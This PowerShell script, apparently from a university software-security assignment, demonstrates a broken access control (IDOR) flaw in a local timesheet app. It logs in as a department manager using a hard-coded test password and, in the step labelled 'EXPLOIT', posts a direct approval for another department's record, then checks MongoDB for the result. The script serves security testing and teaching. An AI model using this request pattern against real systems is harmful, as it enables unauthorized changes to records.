# ============================================================
# Prueba R-03: Control de acceso roto en aprobacion de horas (IDOR)
# P1 - Actividad 1 - Ingenieria de Seguridad de Software
#
# El GET /Horas/Aprobar filtra por el departamento del jefe, pero el
# POST /Horas/CambiarEstado NO revalida la pertenencia: confia en el
# 'codigoRegistro' enviado por el cliente. Un Jefe del depto 003 puede
# aprobar horas de un proyecto del depto 005, fuera de su area.
#
# Jefe usado: EMP003 (depto 003). Objetivo: registro de proyecto P03 (depto 005).
# Uso:  powershell -ExecutionPolicy Bypass -File prueba-aprobacion-idor.ps1
# ============================================================

$base = "http://localhost:5000"
$db   = "mongodb://localhost:27017/GestionProyectosMonster"

Write-Host "=== R-03: IDOR en aprobacion de horas ===" -ForegroundColor Cyan

# 1) SETUP: insertar dos registros pendientes
#    TI9001 -> proyecto P03 (depto 005)  = FUERA del area del jefe EMP003
#    TI9002 -> proyecto P01 (depto 003)  = DENTRO del area (solo para render del token)
mongosh $db --quiet --eval @"
db.registroHoras.deleteMany({_id: {`$in: ['TI9001','TI9002']}});
db.registroHoras.insertMany([
  {_id:'TI9001', empleadoCodigo:'EMP004', proyectoCodigo:'P03', fechaSemana:new Date('2026-10-12'), horas:40, estado:'P', observaciones:null, fechaCreacion:new Date(), fechaModificacion:new Date()},
  {_id:'TI9002', empleadoCodigo:'EMP004', proyectoCodigo:'P01', fechaSemana:new Date('2026-10-12'), horas:10, estado:'P', observaciones:null, fechaCreacion:new Date(), fechaModificacion:new Date()}
]);
print('Setup: TI9001 (P03/depto005) y TI9002 (P01/depto003) creados como pendientes.');
"@

# 2) Login como EMP003 (Jefe de Departamento, depto 003)
$sesion = $null
$g = Invoke-WebRequest "$base/Account/Login" -SessionVariable sesion -UseBasicParsing
$t = ($g.InputFields | ? { $_.name -eq "__RequestVerificationToken" }).value
$login = @{ "__RequestVerificationToken"=$t; "codigo"="EMP003"; "password"="JefeMonster2026"; "returnUrl"="" }
Invoke-WebRequest "$base/Account/Login" -Method Post -Body $login -WebSession $sesion -UseBasicParsing | Out-Null
Write-Host "`n[1] Login como EMP003 (Jefe depto 003) OK" -ForegroundColor Green

# 3) GET de la pantalla de Aprobacion -> ver que TI9001 NO aparece (esta fuera de area)
$ap = Invoke-WebRequest "$base/Horas/Aprobar" -WebSession $sesion -UseBasicParsing
$veTI9001 = $ap.Content -match "TI9001"
$veTI9002 = $ap.Content -match "TI9002"
Write-Host "[2] En su pantalla de Aprobacion:"
Write-Host ("    TI9002 (depto 003, su area) visible : {0}" -f $veTI9002)
Write-Host ("    TI9001 (depto 005, fuera de area)  visible : {0}  <- NO deberia poder tocarlo" -f $veTI9001)

# 4) EXPLOIT: aprobar TI9001 por POST directo, aunque no este en su area
$tokenAtaque = ($ap.InputFields | ? { $_.name -eq "__RequestVerificationToken" } | Select-Object -First 1).value
$exploit = @{ "__RequestVerificationToken"=$tokenAtaque; "codigoRegistro"="TI9001"; "estado"="A"; "observaciones"="aprobado fuera de area" }
$r = Invoke-WebRequest "$base/Horas/CambiarEstado" -Method Post -Body $exploit -WebSession $sesion -UseBasicParsing
Write-Host "`n[3] POST CambiarEstado(TI9001, estado=A) enviado -> HTTP $($r.StatusCode)" -ForegroundColor Yellow

# 5) Verificar en la base el resultado
Write-Host "`n[4] Estado final en la base de datos:" -ForegroundColor Yellow
mongosh $db --quiet --eval "db.registroHoras.find({_id:'TI9001'},{proyectoCodigo:1,estado:1,observaciones:1}).forEach(d=>print('    '+JSON.stringify(d)))"

Write-Host "`n=== RESULTADO ===" -ForegroundColor Yellow
Write-Host "Si TI9001 quedo en estado 'A', un jefe del depto 003 aprobo horas del depto 005:"
Write-Host "control de acceso roto (IDOR) en /Horas/CambiarEstado."
